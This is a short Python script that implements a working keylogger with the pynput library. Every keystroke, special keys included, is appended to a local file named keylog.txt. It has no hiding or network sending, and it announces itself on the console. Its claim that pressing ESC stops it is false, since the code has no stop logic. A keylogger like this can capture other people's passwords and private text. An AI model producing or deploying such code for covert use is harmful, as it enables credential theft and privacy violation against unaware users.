from pynput import keyboard

log_file = "keylog.txt"  # File to store logged keystrokes

def on_press(key):
    """Function to log keystrokes."""
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def main():
    """Starts the keylogger."""
    print("Keylogger running... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Keep listening for key presses

if __name__ == "__main__":
    main()
